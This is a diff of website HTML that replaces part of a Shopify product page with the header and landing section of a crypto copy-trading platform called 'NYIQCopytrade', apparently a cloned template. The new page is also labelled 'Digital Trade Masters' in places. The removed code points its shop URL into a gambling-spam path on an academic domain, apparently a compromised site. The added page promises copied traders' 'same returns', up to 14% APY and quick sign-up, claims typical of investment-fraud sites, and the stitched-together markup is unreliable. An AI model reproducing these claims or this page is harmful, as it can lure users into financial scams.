-        <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-card.css?v=11469293100223554981700311591" rel="stylesheet" type="text/css" media="all" />
-        <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-price.css?v=70172745017360139101700311602" rel="stylesheet" type="text/css" media="all" />
-        <link href="https://iili.io/JRKigR4.md.jpg" rel="stylesheet" type="text/css" media="all" />
-        <style data-shopify>
-          .section-template--15870901977135__related-products-padding {
-            padding-top: 27px;
-            padding-bottom: 21px;
-          }
-
-          @media screen and (min-width: 750px) {
-            .section-template--15870901977135__related-products-padding {
-              padding-top: 36px;
-              padding-bottom: 28px;
-            }
-          }
-        </style>
-        <div class="color-background-1 gradient no-js-hidden">
-          <product-recommendations class="related-products page-width section-template--15870901977135__related-products-padding isolate scroll-trigger animate--slide-in" data-url="/recommendations/products?section_id=template--15870901977135__related-products&product_id=7362949021743&limit=4"></product-recommendations>
+            </div>
         </div>
-      </section>
-    </main>
-    <!-- BEGIN sections: footer-group -->
-    <!-- END sections: footer-group -->
-    <ul hidden>
-      <li id="a11y-refresh-page-message">Choosing a selection results in a full page refresh.</li>
-      <li id="a11y-new-window-message">Opens in a new window.</li>
-    </ul>
-    <script>
-      window.shopUrl = 'https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/';
-      window.routes = {
-        cart_add_url: '/cart/add',
-        cart_change_url: '/cart/change',
-        cart_update_url: '/cart/update',
-        cart_url: '/cart',
-        predictive_search_url: '/search/suggest',
-      };
-      window.cartStrings = {
-        error: `There was an error while updating your cart. Please try again.`,
-        quantityError: `You can only add [quantity] of this item to your cart.`,
-      };
-      window.variantStrings = {
-        addToCart: `Add to cart`,
-        soldOut: `Sold out`,
-        unavailable: `Unavailable`,
-        unavailable_with_option: `[value] - Unavailable`,
-      };
-      window.quickOrderListStrings = {
-        itemsAdded: `[quantity] items added`,
-        itemAdded: `[quantity] item added`,
-        itemsRemoved: `[quantity] items removed`,
-        itemRemoved: `[quantity] item removed`,
-        viewCart: `View cart`,
-        each: `[money]/ea`,
-      };
-      window.accessibilityStrings = {
-        imageAvailable: `Image [index] is now available in gallery view`,
-        shareSuccess: `Link copied to clipboard`,
-        pauseSlideshow: `Pause slideshow`,
-        playSlideshow: `Play slideshow`,
-        recipientFormExpanded: `Gift card recipient form expanded`,
-        recipientFormCollapsed: `Gift card recipient form collapsed`,
-      };
+
+
+        <header class="header">
+            <coingecko-coin-price-marquee-widget coin-ids="bitcoin,ethereum,eos,ripple,litecoin" currency="usd"
+                background-color="#004d4d" locale="en" font-color="#ffffff">
+            </coingecko-coin-price-marquee-widget>
+            <script src="../widgets.coingecko.com/coingecko-coin-price-marquee-widget.js"></script>
+            <nav class="header-wrapper container">
+                <div class="header__logo">
+                    <a href="index-2.html" title="NYIQCopytrade">
+                        <img class="header__logo-svg" style="width: 155px;height: 30px;margin-top:20px"
+                            style="width: 155px;height: 30px;margin-top:20px" src="logo/logo.png" alt="logo" />
+                    </a>
+                </div>
+                <div class="header__mainmenu">
+                    <ul class="mainmenu mainmenu--left-part">
+                        <li class="mainmenu__item mainmenu__item--hoverable">
+                            <div class="mainmenu__link">
+                                Products
+                                <div class="mainmenu__link-dropdown">
+                                    <svg class="link-dropdown__svg" width="12" height="12" viewbox="0 0 12 12"
+                                        fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path opacity="0.684" fill-rule="evenodd" clip-rule="evenodd"
+                                            d="M6.00006 6.82945L9.53806 3.29245C9.63075 3.19958 9.74086 3.12593 9.86209 3.07574C9.98332 3.02556 10.1133 2.99982 10.2445 3C10.3757 3.00019 10.5056 3.0263 10.6266 3.07683C10.7477 3.12736 10.8576 3.20131 10.9501 3.29445C11.3401 3.68445 11.3371 4.32145 10.9521 4.70645L6.70506 8.95345C6.61275 9.04651 6.50293 9.12038 6.38193 9.17079C6.26093 9.22119 6.13115 9.24715 6.00006 9.24715C5.86898 9.24715 5.7392 9.22119 5.6182 9.17079C5.4972 9.12038 5.38738 9.04651 5.29506 8.95345L1.04806 4.70645C0.955191 4.61377 0.881545 4.50365 0.831358 4.38242C0.781171 4.26119 0.75543 4.13124 0.755616 4.00003C0.755802 3.86883 0.78191 3.73895 0.832441 3.61786C0.882972 3.49678 0.956929 3.38687 1.05006 3.29445C1.2375 3.10792 1.49101 3.00295 1.75545 3.00239C2.01988 3.00183 2.27384 3.10572 2.46206 3.29145L6.00006 6.82945Z"
+                                            fill="white"></path>
+                                    </svg>
+                                </div>
+                            </div>
+                            <ul class="mainmenu__submenu">
+                                <li><a href="platform.html">NYIQCopytrade Platform</a></li>
+                                <li><a href="covesting.html">Copy-trading Module</a></li>
+                                <li><a href="yield.html">Yield Accounts</a></li>
+                                <li><a href="contests.html">Trading Contests</a></li>
+                            </ul>
+                        </li>
+                        <li class="mainmenu__item mainmenu__item--hoverable">
+                            <div class="mainmenu__link">
+                                Markets
+                                <div class="mainmenu__link-dropdown">
+                                    <svg class="link-dropdown__svg" width="12" height="12" viewbox="0 0 12 12"
+                                        fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path opacity="0.684" fill-rule="evenodd" clip-rule="evenodd"
+                                            d="M6.00006 6.82945L9.53806 3.29245C9.63075 3.19958 9.74086 3.12593 9.86209 3.07574C9.98332 3.02556 10.1133 2.99982 10.2445 3C10.3757 3.00019 10.5056 3.0263 10.6266 3.07683C10.7477 3.12736 10.8576 3.20131 10.9501 3.29445C11.3401 3.68445 11.3371 4.32145 10.9521 4.70645L6.70506 8.95345C6.61275 9.04651 6.50293 9.12038 6.38193 9.17079C6.26093 9.22119 6.13115 9.24715 6.00006 9.24715C5.86898 9.24715 5.7392 9.22119 5.6182 9.17079C5.4972 9.12038 5.38738 9.04651 5.29506 8.95345L1.04806 4.70645C0.955191 4.61377 0.881545 4.50365 0.831358 4.38242C0.781171 4.26119 0.75543 4.13124 0.755616 4.00003C0.755802 3.86883 0.78191 3.73895 0.832441 3.61786C0.882972 3.49678 0.956929 3.38687 1.05006 3.29445C1.2375 3.10792 1.49101 3.00295 1.75545 3.00239C2.01988 3.00183 2.27384 3.10572 2.46206 3.29145L6.00006 6.82945Z"
+                                            fill="white"></path>
+                                    </svg>
+                                </div>
+                            </div>
+                            <ul class="mainmenu__submenu">
+                                <li>
+                                    <a href="cryptocurrency-margin-trading.html">Cryptocurrencies</a>
+                                </li>
+                                <li><a href="forex-trading.html">Forex currencies</a></li>
+                                <li><a href="commodities-trading.html">Commodities</a></li>
+                                <li><a href="index-trading.html">Stock Indices</a></li>
+                                <li>
+                                    <a href="leverage-trading-crypto-indices-forex.html">All Trading Instruments</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="mainmenu__item mainmenu__item--hoverable">
+                            <div class="mainmenu__link">
+                                Trading Tools
+                                <div class="mainmenu__link-dropdown">
+                                    <svg class="link-dropdown__svg" width="12" height="12" viewbox="0 0 12 12"
+                                        fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path opacity="0.684" fill-rule="evenodd" clip-rule="evenodd"
+                                            d="M6.00006 6.82945L9.53806 3.29245C9.63075 3.19958 9.74086 3.12593 9.86209 3.07574C9.98332 3.02556 10.1133 2.99982 10.2445 3C10.3757 3.00019 10.5056 3.0263 10.6266 3.07683C10.7477 3.12736 10.8576 3.20131 10.9501 3.29445C11.3401 3.68445 11.3371 4.32145 10.9521 4.70645L6.70506 8.95345C6.61275 9.04651 6.50293 9.12038 6.38193 9.17079C6.26093 9.22119 6.13115 9.24715 6.00006 9.24715C5.86898 9.24715 5.7392 9.22119 5.6182 9.17079C5.4972 9.12038 5.38738 9.04651 5.29506 8.95345L1.04806 4.70645C0.955191 4.61377 0.881545 4.50365 0.831358 4.38242C0.781171 4.26119 0.75543 4.13124 0.755616 4.00003C0.755802 3.86883 0.78191 3.73895 0.832441 3.61786C0.882972 3.49678 0.956929 3.38687 1.05006 3.29445C1.2375 3.10792 1.49101 3.00295 1.75545 3.00239C2.01988 3.00183 2.27384 3.10572 2.46206 3.29145L6.00006 6.82945Z"
+                                            fill="white"></path>
+                                    </svg>
+                                </div>
+                            </div>
+                            <ul class="mainmenu__submenu">
+                                <li>
+                                    <a href="trade-bitcoin-long-and-short.html">Long/Short Trading</a>
+                                </li>
+                                <li>
+                                    <a href="trade-bitcoin-with-leverage.html">Bitcoin Leverage</a>
+                                </li>
+                                <li>
+                                    <a href="price-chart/cryptocurrencies.html">Cryptocurrency Price Charts</a>
+                                </li>
+                                <li>
+                                    <a href="price-chart/currencies.html">Forex Price Charts</a>
+                                </li>
+                                <li>
+                                    <a href="price-chart/indices.html">Index Price Charts</a>
+                                </li>
+                                <li>
+                                    <a href="price-chart/commodities.html">Commodity Price Charts</a>
+                                </li>
+                                <li><a href="copy-trading.html">Copy Trading</a></li>
+                            </ul>
+                        </li>
+                        <li class="mainmenu__item mainmenu__item--hoverable">
+                            <div class="mainmenu__link">
+                                About
+                                <div class="mainmenu__link-dropdown">
+                                    <svg class="link-dropdown__svg" width="12" height="12" viewbox="0 0 12 12"
+                                        fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path opacity="0.684" fill-rule="evenodd" clip-rule="evenodd"
+                                            d="M6.00006 6.82945L9.53806 3.29245C9.63075 3.19958 9.74086 3.12593 9.86209 3.07574C9.98332 3.02556 10.1133 2.99982 10.2445 3C10.3757 3.00019 10.5056 3.0263 10.6266 3.07683C10.7477 3.12736 10.8576 3.20131 10.9501 3.29445C11.3401 3.68445 11.3371 4.32145 10.9521 4.70645L6.70506 8.95345C6.61275 9.04651 6.50293 9.12038 6.38193 9.17079C6.26093 9.22119 6.13115 9.24715 6.00006 9.24715C5.86898 9.24715 5.7392 9.22119 5.6182 9.17079C5.4972 9.12038 5.38738 9.04651 5.29506 8.95345L1.04806 4.70645C0.955191 4.61377 0.881545 4.50365 0.831358 4.38242C0.781171 4.26119 0.75543 4.13124 0.755616 4.00003C0.755802 3.86883 0.78191 3.73895 0.832441 3.61786C0.882972 3.49678 0.956929 3.38687 1.05006 3.29445C1.2375 3.10792 1.49101 3.00295 1.75545 3.00239C2.01988 3.00183 2.27384 3.10572 2.46206 3.29145L6.00006 6.82945Z"
+                                            fill="white"></path>
+                                    </svg>
+                                </div>
+                            </div>
+                            <ul class="mainmenu__submenu">
+                                <li><a href="about.html">About Us</a></li>
+                                <li><a href="index.html">Security</a></li>
+                                <li><a href="index.html">Fees and Conditions</a></li>
+                                <li><a href="press-and-media.html">Press and Media</a></li>
+                                <li>
+                                    <a href="https://help.NYIQCopytrade.com/" target="_blank"
+                                        rel="noopener noreferrer">Help Center</a>
+                                </li>
+                                <li><a href="index.html">Blog</a></li>
+                            </ul>
+                        </li>
+                        <li class="mainmenu__item mainmenu__item--hoverable">
+                            <div class="mainmenu__link">
+                                Refer &amp; Earn
+                                <div class="mainmenu__link-dropdown">
+                                    <svg class="link-dropdown__svg" width="12" height="12" viewbox="0 0 12 12"
+                                        fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path opacity="0.684" fill-rule="evenodd" clip-rule="evenodd"
+                                            d="M6.00006 6.82945L9.53806 3.29245C9.63075 3.19958 9.74086 3.12593 9.86209 3.07574C9.98332 3.02556 10.1133 2.99982 10.2445 3C10.3757 3.00019 10.5056 3.0263 10.6266 3.07683C10.7477 3.12736 10.8576 3.20131 10.9501 3.29445C11.3401 3.68445 11.3371 4.32145 10.9521 4.70645L6.70506 8.95345C6.61275 9.04651 6.50293 9.12038 6.38193 9.17079C6.26093 9.22119 6.13115 9.24715 6.00006 9.24715C5.86898 9.24715 5.7392 9.22119 5.6182 9.17079C5.4972 9.12038 5.38738 9.04651 5.29506 8.95345L1.04806 4.70645C0.955191 4.61377 0.881545 4.50365 0.831358 4.38242C0.781171 4.26119 0.75543 4.13124 0.755616 4.00003C0.755802 3.86883 0.78191 3.73895 0.832441 3.61786C0.882972 3.49678 0.956929 3.38687 1.05006 3.29445C1.2375 3.10792 1.49101 3.00295 1.75545 3.00239C2.01988 3.00183 2.27384 3.10572 2.46206 3.29145L6.00006 6.82945Z"
+                                            fill="white"></path>
+                                    </svg>
+                                </div>
+                            </div>
+                            <ul class="mainmenu__submenu">
+                                <li><a href="cpa.html">Affiliates</a></li>
+                                <li><a href="ambassador.html">Ambassadors</a></li>
+                            </ul>
+                        </li>
+                    </ul>
+                    <ul class="mainmenu">
+                        <li class="mainmenu__item mainmenu__item--hoverable mainmenu__item--language-selector">
+
+                            <style>
+                            .goog-logo-link {
+                                display: none
+                            }
+
+                            .goog-te-gadget {
+                                color: transparent;
+                                padding-left: 20px;
+                            }
+
+                            .goog-te-gadget .goog-te-combo {
+                                color: green;
+                                max-width: 100px;
+
+                            }
+
+                            .VIpgJd-ZVi9od-l4eHX-hSRGPd {
+                                display: none
+                            }
+                            </style>
+                            <div id="google_translate_element"></div>
+
+                            <script type="text/javascript">
+                            function googleTranslateElementInit() {
+                                new google.translate.TranslateElement({
+                                    pageLanguage: 'en'
+                                }, 'google_translate_element');
+                            }
+                            </script>
+                            <script type="text/javascript"
+                                src="../translate.google.com/translate_a/elementa0d8.js?cb=googleTranslateElementInit">
+                            </script>
+
+
+
+                        </li>
+                        <li class="mainmenu__item mainmenu__link--login">
+                            <a class="mainmenu__link mainmenu__link--inscription" href="id/sign-in.html"
+                                title="login">Login</a><a class="mainmenu__link mainmenu__link--logo"
+                                href="id/sign-in.html" title="login"><svg class="login-logo__svg" width="24" height="24"
+                                    viewbox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M12 2C6.47715 2 2 6.47715 2 12C2 14.9867 3.30939 17.6676 5.38544 19.5C7.14827 21.0559 9.46388 22 12 22C14.5361 22 16.8517 21.0559 18.6146 19.5C20.6906 17.6676 22 14.9867 22 12C22 6.47715 17.5228 2 12 2Z"
+                                        stroke="white" stroke-width="1.5" stroke-linecap="round"
+                                        stroke-linejoin="round"></path>
+                                    <path
+                                        d="M12.8888 6.66669H15.1851C15.4896 6.66669 15.7816 6.78765 15.997 7.00297C16.2123 7.21829 16.3332 7.51033 16.3332 7.81484V15.8519C16.3332 16.1564 16.2123 16.4484 15.997 16.6637C15.7816 16.8791 15.4896 17 15.1851 17H12.8888"
+                                        stroke="white" stroke-width="1.5" stroke-linecap="round"
+                                        stroke-linejoin="round"></path>
+                                    <path d="M10.0186 14.7036L12.8889 11.8332L10.0186 8.96283" stroke="white"
+                                        stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M12.8889 11.8334H6" stroke="white" stroke-width="1.5"
+                                        stroke-linecap="round" stroke-linejoin="round"></path>
+                                </svg></a>
+                        </li>
+                        <li class="mainmenu__link--register">
+                            <a class="btn mainmenu__register-link btn--min-size" href="id/sign-up.html"
+                                title="register">Register</a>
+                        </li>
+                    </ul>
+                </div>
+                <div class="header__burger">
+                    <svg class="header__burger-icon-svg" width="24" height="24" viewbox="0 0 24 24" fill="none"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path d="M3 12L21 12" stroke="white" stroke-width="1.5" stroke-linecap="round"
+                            stroke-linejoin="round"></path>
+                        <path d="M3 6H21" stroke="white" stroke-width="1.5" stroke-linecap="round"
+                            stroke-linejoin="round"></path>
+                        <path d="M3 18L21 18" stroke="white" stroke-width="1.5" stroke-linecap="round"
+                            stroke-linejoin="round"></path>
+                    </svg>
+                </div>
+                <nav class="mobmenu">
+                    <div class="mobmenu__content">
+                        <div class="mobmenu__head">
+                            <div class="header__logo">
+                                <a href="index-2.html" title="Main page"><img class="header__logo-img" src="logo/logo.png"
+                                        alt="Digital Trade Masters logo" width="153" height="76" /></a>
+                            </div>
+                            <div class="header__burger">
+                                <svg width="24" height="24" viewbox="0 0 24 24" fill="#fff"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M3 12L21 12" stroke="white" stroke-width="1.5" stroke-linecap="round"
+                                        stroke-linejoin="round"></path>
+                                    <path d="M3 6H21" stroke="white" stroke-width="1.5" stroke-linecap="round"
+                                        stroke-linejoin="round"></path>
+                                    <path d="M3 18L21 18" stroke="white" stroke-width="1.5" stroke-linecap="round"
+                                        stroke-linejoin="round"></path>
+                                </svg>
+                            </div>
+                        </div>
+                        <ul class="mobmenu__item mobmenu__section">
+                            <li class="mobmenu__section-caption">
+                                Products<img src="assets/icons/mobmenu-dropdown82de.svg" alt="dropdown icon" width="24"
+                                    height="59" />
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="platform.html">Digital Trade Masters Platform</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="covesting.html">Copy-trading Module</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="yield.html">Yield Accounts</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="contests.html">Trading Contests</a>
+                            </li>
+                        </ul>
+                        <ul class="mobmenu__item mobmenu__section">
+                            <li class="mobmenu__section-caption">
+                                Markets<img src="assets/icons/mobmenu-dropdown82de.svg" alt="dropdown icon" width="24"
+                                    height="59" />
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="cryptocurrency-margin-trading.html">Cryptocurrencies</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="forex-trading.html">Forex currencies</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="commodities-trading.html">Commodities</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index-trading.html">Stock Indices</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="leverage-trading-crypto-indices-forex.html">All Trading Instruments</a>
+                            </li>
+                        </ul>
+                        <ul class="mobmenu__item mobmenu__section">
+                            <li class="mobmenu__section-caption">
+                                Trading Tools<img src="assets/icons/mobmenu-dropdown82de.svg" alt="dropdown icon"
+                                    width="24" height="59" />
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="trade-bitcoin-long-and-short.html">Long/Short Trading</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="trade-bitcoin-with-leverage.html">Bitcoin Leverage</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="price-chart/cryptocurrencies.html">Cryptocurrency Price Charts</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="price-chart/currencies.html">Forex Price Charts</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="price-chart/indices.html">Index Price Charts</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="price-chart/commodities.html">Commodity Price Charts</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="copy-trading.html">Copy Trading</a>
+                            </li>
+                        </ul>
+                        <ul class="mobmenu__item mobmenu__section">
+                            <li class="mobmenu__section-caption">
+                                About<img src="assets/icons/mobmenu-dropdown82de.svg" alt="dropdown icon" width="24"
+                                    height="59" />
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="about.html">About Us</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Security</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Fees and Conditions</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="press-and-media.html">Press and Media</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="https://help.NYIQCopytrade.com/" target="_blank"
+                                    rel="noopener noreferrer">Help Center</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="index.html">Blog</a>
+                            </li>
+                        </ul>
+                        <ul class="mobmenu__item mobmenu__section">
+                            <li class="mobmenu__section-caption">
+                                Refer &amp; Earn<img src="assets/icons/mobmenu-dropdown82de.svg" alt="dropdown icon"
+                                    width="24" height="59" />
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="cpa.html">Affiliates</a>
+                            </li>
+                            <li class="mobmenu__section-item">
+                                <a href="ambassador.html">Ambassadors</a>
+                            </li>
+                        </ul>
+                        <a class="btn btn--filled mobmenu__btn-link mobmenu__btn-link--register"
+                            href="id/sign-up.html">Register</a><a class="btn mobmenu__btn-link mobmenu__btn-link--login"
+                            href="id/sign-in.html">Login</a>
+                    </div>
+                </nav>
+            </nav>
+
+        </header>
+
+
+
+
+
+
+
+
+
+
+        <section class="slider-section" data-affects-page-color-slider="">
+            <div class="main slider-element prs-container first-slide slider-element--visible"
+                data-slide-main-color="#010623">
+                <div class="main__inner">
+                    <div class="carousel-assets-ad__left-part">
+                        <h1 class="main__title main__title--wide">
+                            Next generation trading platform
+                        </h1>
+                        <h2 class="main__title-3">
+                            NYIQCopytrade is an award-winning platform that allows you to
+                            trade global financial markets using Bitcoin, USD Tether, USDC
+                            and more
+                        </h2>
+                        <div class="button__group">
+                            <div class="button__container btn--fullsized-container">
+                                <a class="btn btn--filled index-action assets-section__action btn--fullsized"
+                                    href="id/sign-up.html">Open free account</a><a
+                                    class="btn preview-platform-btn index-action DEMO">Preview platform</a>
+                            </div>
+                            <div></div>
+                            <div class="presentation-button">
+                                <div></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="main-prosp">
+                        <div class="main-prosp__million">&nbsp</div>
+                        <div class="main-prosp__sign-up">
+                            24 hour volume (All markets)
+                        </div>
+                        <div class="main-prosp__divider"></div>
+                        <div class="main-prosp__title">Trade with NYIQCopytrade:</div>
+                        <ul class="main-prosp__list">
+                            <li class="main-prosp__list-item">80+ markets</li>
+                            <li class="main-prosp__list-item">Margin trading</li>
+                            <li class="main-prosp__list-item">Long & Short</li>
+                            <li class="main-prosp__list-item">Secure wallets</li>
+                            <li class="main-prosp__list-item">24/7 service</li>
+                            <li class="main-prosp__list-item">Fees from 0.001%</li>
+                        </ul>
+                        <div class="main-prosp__button">
+                            <a class="main-prosp__btn btn" href="id/sign-up.html">Start trading</a>
+                        </div>
+                        <div class="main-prosp__list-item main-prosp__kyc-message">
+                            Registration takes only 40 seconds!
+                        </div>
+                        <div class="main-prosp__links-to-s"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="carousel-assets-ad prs-container slider-element second-slide second-slide-bg white-slide"
+                data-slide-main-color="#ffffff">
+                <div class="carousel-assets-ad__left-part">
+                    <h1 class="main__title">80+ markets. One account</h1>
+                    <h2 class="main__title-3 carousel-assets-ad__title-3">
+                        Trade Cryptocurrencies, Stock Indices, Commodities and Forex from
+                        a single account
+                    </h2>
+                    <div class="button__group">
+                        <div class="button__container btn--fullsized-container">
+                            <a class="btn btn--filled index-action assets-section__action btn--fullsized"
+                                href="leverage-trading-crypto-indices-forex.html">See all products</a><a
+                                class="btn index-action DEMO">Preview platform</a>
+                        </div>
+                        <div class="presentation-button black-btn">
+                            <div></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="carousel-assets-ad__right-part"></div>
+            </div>
+            <div class="carousel-assets-ad prs-container slider-element third-slide white-slide"
+                data-slide-main-color="#fdfdfd">
+                <div class="carousel-assets-ad__left-part carousel-assets-ad__left-part--covesting">
+                    <h1 class="main__title">Let top traders do the job for you!</h1>
+                    <h2 class="main__title-3 carousel-assets-ad__title-3">
+                        Covesting Copy-trading allows you to automatically copy
+                        top-performing traders and achieve the same returns
+                    </h2>
+                    <div class="button__group">
+                        <div class="button__container btn--fullsized-container">
+                            <a class="btn btn--filled index-action assets-section__action btn--fullsized"
+                                href="covesting.html">Discover Covesting</a><a class="btn index-action DEMO">Preview
+                                platform</a>
+                        </div>
+                    </div>
+                </div>
+                <div
+                    class="carousel-assets-ad__right-part third-slide__right-part carousel-assets-ad__right-part--covesting">
+                </div>
+            </div>
+            <div class="carousel-assets-ad prs-container slider-element fourth-slide" data-slide-main-color="#01050e">
+                <div class="carousel-assets-ad__left-part">
+                    <h1 class="main__title">Get paid for inviting friends</h1>
+                    <h2 class="main__title-3 carousel-assets-ad__title-3">
+                        Invite friends and get up to 50% of what they pay in trading fees.
+                        Join referral program today!
+                    </h2>
+                    <div class="button__group">
+                        <div class="button__container btn--fullsized-container">
+                            <a class="btn btn--filled index-action assets-section__action btn--fullsized"
+                                href="cpa.html">Start earning</a><a class="btn index-action DEMO">Preview platform</a>
+                        </div>
+                        <div class="presentation-button">
+                            <div></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="carousel-assets-ad__right-part carousel-assets-ad__right-part--rating">
+                    <div class="affiliate-rating">
+                        <table>
+                            <caption>
+                                Top earning partners
+                            </caption>
+                            <thead>
+                                <tr>
+                                    <th>Rank</th>
+                                    <th>Referral ID</th>
+                                    <th>Total referrals</th>
+                                    <th>USD earnings</th>
+                                </tr>
+                            </thead>
+                            <tbody id="rating"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+            <div class="carousel-assets-ad prs-container slider-element fifth-slide black-slide">
+                <div class="carousel-assets-ad__left-part carousel-assets-ad__left-part--yield">
+                    <h1 class="main__title">Earn daily interest on your crypto!</h1>
+                    <h2 class="main__title-3 carousel-assets-ad__title-3">
+                        Stake most popular cryptocurrencies and earn up to 14% APY
+                    </h2>
+                    <div class="button__group">
+                        <div class="button__container btn--fullsized-container">
+                            <a class="btn btn--filled index-action assets-section__action btn--fullsized"
+                                href="yield.html">Start earning</a><a class="btn index-action DEMO">Preview platform</a>
+                        </div>
+                    </div>
+                </div>
+                <div
+                    class="carousel-assets-ad__right-part fifth-slide__right-part carousel-assets-ad__right-part--yield">
+                </div>
+            </div>
+            <div class="thumbnails">
+                <div class="thumbnail thumbnail--active"><span></span></div>
+                <div class="thumbnail"><span></span></div>
+                <div class="thumbnail"><span></span></div>
+                <div class="thumbnail"><span></span></div>
+                <div class="thumbnail"><span></span></div>
+            </div>
+
+            <div class="tickers-section prs-container">
+                <div class="tickers"></div>
+            </div>
+        </section>
+
+        <!-- TradingView Widget BEGIN -->
+
+        <!-- TradingView Widget END -->
+
+
+
+        <section class="assets-section assets-section-container prs-container">
+            <div class="assets-text__container">
+                <div class="prs-title assets-section__title assets-section__title--desktop">
+                    Trade Bitcoin, S&P 500, Gold, EURUSD and 80+ assets
+                </div>
+                <div class="prs-text assets-section__text">
+                    <span>Get easy access to </span><a class="prm-link"
+                        href="cryptocurrency-margin-trading.html">Cryptocurrencies</a><span>, </span><a class="prm-link"
+                        href="index-trading.html">Stock Indices</a><span>, </span><a class="prm-link"
+                        href="commodities-trading.html">Commodities</a><span> and </span><a class="prm-link"
+                        href="forex-trading.html">Forex</a><span> markets from a single account</span>
+                </div>
+                <div class="assets-button__container assets-button__container-before-table">
+                    <a class="btn btn--filled index-action assets-section__action btn--description btn--fullsized"
+                        href="id/sign-up.html">Open free account</a>
+                    <div class="prs-text prs-text-comment">
+                        Quick registration. Start trading in minutes!
+                    </div>
+                </div>
+            </div>
+
+            <!-- TradingView Widget BEGIN -->
+                <!-- TradingView Widget BEGIN -->
+<div class="tradingview-widget-container">
+    <div class="tradingview-widget-container__widget"></div>
+    <div class="tradingview-widget-copyright"><a href="https://www.tradingview.com/" rel="noopener nofollow" target="_blank"><span class="blue-text">Track all markets on TradingView</span></a></div>
+    <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-market-overview.js" async>
+    {
+    "colorTheme": "light",
+    "dateRange": "12M",
+    "showChart": true,
+    "locale": "en",
+    "largeChartUrl": "",
+    "isTransparent": true,
+    "showSymbolLogo": true,
+    "showFloatingTooltip": false,
+    "width": "770",
+    "height": "520",
+    "plotLineColorGrowing": "rgba(41, 98, 255, 1)",
+    "plotLineColorFalling": "rgba(41, 98, 255, 1)",
+    "gridLineColor": "rgba(240, 243, 250, 0)",
+    "scaleFontColor": "rgba(106, 109, 120, 1)",
+    "belowLineFillColorGrowing": "rgba(41, 98, 255, 0.12)",
+    "belowLineFillColorFalling": "rgba(41, 98, 255, 0.12)",
+    "belowLineFillColorGrowingBottom": "rgba(41, 98, 255, 0)",
+    "belowLineFillColorFallingBottom": "rgba(41, 98, 255, 0)",
+    "symbolActiveColor": "rgba(41, 98, 255, 0.12)",
+    "tabs": [
+      {
+        "title": "Indices",
+        "symbols": [
+          {
+            "s": "FOREXCOM:SPXUSD",
+            "d": "S&P 500"
+          },
+          {
+            "s": "FOREXCOM:NSXUSD",
+            "d": "US 100"
+          },
+          {
+            "s": "FOREXCOM:DJI",
+            "d": "Dow 30"
+          },
+          {
+            "s": "INDEX:NKY",
+            "d": "Nikkei 225"
+          },
+          {
+            "s": "INDEX:DEU40",
+            "d": "DAX Index"
+          },
+          {
+            "s": "FOREXCOM:UKXGBP",
+            "d": "UK 100"
+          }
+        ],
+        "originalTitle": "Indices"
+      },
+      {
+        "title": "Futures",
+        "symbols": [
+          {
+            "s": "CME_MINI:ES1!",
+            "d": "S&P 500"
+          },
+          {
+            "s": "CME:6E1!",
+            "d": "Euro"
+          },
+          {
+            "s": "COMEX:GC1!",
+            "d": "Gold"
+          },
+          {
+            "s": "NYMEX:CL1!",
+            "d": "WTI Crude Oil"
+          },
+          {
+            "s": "NYMEX:NG1!",
+            "d": "Gas"
+          },
+          {
+            "s": "CBOT:ZC1!",
+            "d": "Corn"
+          }
+        ],
+        "originalTitle": "Futures"
+      },
+      {
+        "title": "Bonds",
+        "symbols": [
+          {
+            "s": "CBOT:ZB1!",
+            "d": "T-Bond"
+          },
+          {
+            "s": "CBOT:UB1!",
+            "d": "Ultra T-Bond"
+          },
+          {
+            "s": "EUREX:FGBL1!",
+            "d": "Euro Bund"
+          },
+          {
+            "s": "EUREX:FBTP1!",
+            "d": "Euro BTP"
+          },
+          {
+            "s": "EUREX:FGBM1!",
+            "d": "Euro BOBL"
+          }
+        ],
+        "originalTitle": "Bonds"
+      },
+      {
+        "title": "Forex",
+        "symbols": [
+          {
+            "s": "FX:EURUSD",
+            "d": "EUR to USD"
+          },
+          {
+            "s": "FX:GBPUSD",
+            "d": "GBP to USD"
+          },
+          {
